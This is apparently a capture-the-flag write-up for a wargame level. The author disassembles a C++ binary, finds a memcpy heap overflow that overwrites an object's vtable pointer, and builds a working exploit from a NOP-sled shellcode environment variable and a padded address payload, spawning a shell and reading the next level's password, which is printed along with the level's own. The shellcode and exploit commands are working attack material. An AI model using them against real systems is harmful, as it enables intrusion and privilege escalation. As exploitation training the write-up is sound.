login : pw
	level9 : c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a

If you disas the main you get some function that seems randomly named which are:
	=> call   0x8048530 <_Znwj@plt>
	=> call   0x80486f6 <_ZN1NC2Ei>
	=> call   0x804870e <_ZN1N13setAnnotationEPc>

All of those are prefixed with a call instruction so:
i func
	=> 0x08048530  _Znwj@plt
		=> Same address there is:
			=> 0x08048530  operator new(unsigned int)
	=> Address 0x80486f6 (_ZN1NC2Ei) is referred as:
		=> 0x080486f6  N::N(int)
	=> Address 0x804870e (_ZN1N13setAnnotationEPc) is referred as:
		=> 0x0804870e  N::setAnnotation(char*)
We can also see that the class N holds other method such as:
	=> 0x0804873a  N::operator+(N&)
	=> 0x0804874e  N::operator-(N&)

Ok so our program source language is cpp and it has a class N

disas main
	=> stack allocated = 0x20 = 32
	=> cmp    DWORD PTR [ebp+0x8],0x1
		=> ebp+0x8 refers to ac
	=> if ac < 2
		=> calls exit with 1
	=> calls _Znwj with 0x6c
		=> We know that this is operator new
			=> 0x6c must be the object size
	=> Calls _ZN1NC2Ei with ret value from operator new and 0x5
		=> We know that this is the N constructor
			=> stores ret value in esp+0x1c
	=> calls _Znwj with 0x6c once again
	=> Calls _ZN1NC2Ei once again but with 0x6
		=> We know that this is the N constructor
			=> stores ret value in esp+0x18
	=> Moves esp+0x1c (first N instance) to esp+0x14
	=> Moves esp+0x18 (second N instance) to esp+0x10
	=> calls _ZN1N13setAnnotationEPc
		=> We know that this is N method setAnnotation
			=> first param is class instance which is esp+0x14 (first instance)
			=> second param is:
				=> eax <= *(eax+0x4) <= *(ebp+0xc)
					=> *(ebp+0xc) = av
					=> *(*(ebp+0xc)+0x4) = av[1]
	=> call edx before return
		=> edx <= [eax] <= [eax] <= [esp+0x10] (second class instance)
			=> [esp+0x10] => access second class pointer
			=> [eax] => access second class instance in memory
			=> [eax] => access first function pointer	
				=> With a test on ./level9, you find out it corresponds to N::operator+(N&)
		=> param is esp+0x14 first instance

disas 0x080486f6 (constructor)
	eax,DWORD PTR [ebp+0x8]
		=> [ebp+0x8] is passed parameter (this)
			=> defines this as N object: mov    DWORD PTR [eax],0x8048848
	mov    DWORD PTR [eax+0x68],edx
		=> edx being ebp+0xc so the second parameter(our passed value n)
			=> This is stored at offset 0x68 = 104

disas 0x0804870e (setAnnotation)
	calls strlen with ebp+0xc
		=> 0x4 = pushed ebp
		=> 0x8 = this
		=> 0xc = first provided param = av[1]
	calls memcpy with:
		=> esp <= edx <= edx+0x4 <= [ebp+0x8]
			=> *this + 0x4 must hold a string
		=> esp+0x4 <= eax <= [ebp+0xc]
			=> av[1]
		=> esp+0x8 <= eax <= return value of strlen

disas 0x0804873a (operator+)
	add each object offset 0x68 (int values)

That was tedious but we see that memcpy is used so we can exploit it

r aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
	=> segfault, perfect
		=> segfault address (0x08048682 in main())
		=> right after setAnnotation which uses memcpy, perfect

I was lazy so I calculated the offset with gdb-peda
	=> pattern create/pattern offset
=> Found 108 as offset
	=> That's object size

Lets check what is at 0x08048682 in main()
	=> 0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
	=> 0x0804867c <+136>:	mov    eax,DWORD PTR [esp+0x10]
	=> 0x08048680 <+140>:	mov    eax,DWORD PTR [eax]
	=> 0x08048682 <+142>:	mov    edx,DWORD PTR [eax]
	=> ...
	=> 0x08048693 <+159>:	call   edx
		=> get second address, after setAnnotation call on first one
		=> dereference it to get second instance
		=> dereference it to call first function in this object memory
		=> call this function

Looks like we just need to change the address pointed by second instance 1st function

Lets create an env var holding our shell code to avoid future problem due to memory alignment

Refer to level2:
	env -i exploit=$(python -c 'print "\x90" * 10000 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"') gdb level9
	unset env LINES
	unset env COLUMNS
	start
	get exploit start address
		info var environ
			=> 0xb7eede04  environ
		x/s *((char**)environ)
			=> 0xbfffd87d:	 "exploit=...
		10000 * "\x90" => 0xbfffd87d+5000 = 0xbfffec05
	r $(python -c 'print "a"*108 + "\x05\xec\xff\xbf"')
		=> segfault 0x90909090
			=> Of course I dererence "\x05\xec\xff\xbf" and then call it
			=> I need an address that wont move due to memory assignement that will then points to 0xbfffec05
	Lets get second instance address
		=> b *main+140
			=> Right after second instance address in eax
		=> i r eax
			=> 0x804a078
		=> p/x 0x804a078+4
			=> 0x804a07c
	r $(python -c 'print "a"*108 + "\x7c\xa0\x04\x08" + "\x05\xec\xff\xbf"')
		=> bash started	

Lets try outside of gdb
env -i exploit=$(python -c 'print "\x90" * 10000 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"') ./level9 $(python -c 'print "a"*108 + "\x7c\xa0\x04\x08" + "\x05\xec\xff\xbf"')	
	=> bash started
	=> whoami
		=> bonus0
	=> cat /home/user/bonus0/.pass
		=> f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728


















